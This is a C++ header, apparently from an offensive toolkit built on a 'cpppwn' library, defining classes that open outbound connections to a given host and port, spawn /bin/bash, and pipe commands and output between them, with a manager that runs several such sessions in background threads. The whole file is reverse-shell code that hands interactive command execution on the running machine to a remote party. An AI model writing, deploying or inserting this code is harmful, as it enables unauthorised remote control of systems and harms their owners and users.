#pragma once

#include "Logger.hpp"
#include <Remote.hpp>
#include <Shell.hpp>
#include <string>

#include <cpppwn.hpp>

//-------------------------------------------------
//
//-------------------------------------------------
class RemoteSession {
private:
    std::atomic<bool>& global_running;
    std::string host;
    int port;
    std::string session_id;

public:
    //-------------------------------------------------
    //
    //-------------------------------------------------
    RemoteSession(std::string id, std::string h, int p, std::atomic<bool>& run)
        : global_running(run), host(h), port(p), session_id(id) {

    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    void run() {
        try {
            logger::debug("Session {}: Attempting connection to {}:{}", session_id, host, port);
            cpppwn::Remote conn(host, port, true);
            cpppwn::Process shell("/bin/bash");
            logger::debug("Session {}: Connection established and shell spawned.", session_id);

            while (global_running && conn.is_alive() && shell.is_alive()) {
                shell.send(conn.recvline());
                conn.send(shell.recvall());
            }
        } catch (const std::exception& e) {
            logger::debug("Session {} encountered error: {}", session_id, e.what());
        }
        logger::debug("Session {} closed.", session_id);
    }
};

//-------------------------------------------------
//
//-------------------------------------------------
class SessionManager {
private:
    struct SessionEntry {
        std::thread worker;
        std::atomic<bool> stop_flag{false};
    };

    std::map<std::string, std::unique_ptr<SessionEntry>> sessions;
    std::mutex mtx;

public:
    //-------------------------------------------------
    //
    //-------------------------------------------------
    void start_session(const std::string& id, const std::string& host, int port) {
        std::lock_guard lock(mtx);
        if (sessions.contains(id)) return;

        auto entry = std::make_unique<SessionEntry>();

        // Spawn the shell thread
        entry->worker = std::thread([id, host, port, &stop = entry->stop_flag]() -> void {
            RemoteSession session(id, host, port, stop);
            session.run();
        });

        sessions[id] = std::move(entry);
    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    void stop_sessions() {
        std::lock_guard lock(mtx);
        if (sessions.size() > 0) {
            for(auto& [id, session] : sessions) {
                session->stop_flag = true;
                if (session->worker.joinable()) {
                    session->worker.detach();
                }
            }
            sessions.clear();
        }
    }
};
